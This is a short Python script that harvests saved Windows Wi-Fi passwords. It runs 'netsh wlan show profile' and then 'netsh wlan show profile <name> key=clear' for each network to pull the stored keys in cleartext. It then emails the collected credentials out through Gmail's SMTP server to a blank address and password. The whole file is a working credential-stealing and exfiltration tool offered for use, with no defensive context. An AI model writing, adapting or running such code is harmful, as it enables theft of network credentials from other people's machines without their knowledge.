#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# For Windows
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_name_list = re.findall(
    "(?:Profile\s*:\s)(.*)", networks
)

result = ""
for network_name in network_name_list:
    command = "netsh wlan show profile {} key=clear".format(network_name)
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

email = ""
password = ""

send_mail(email, password, result)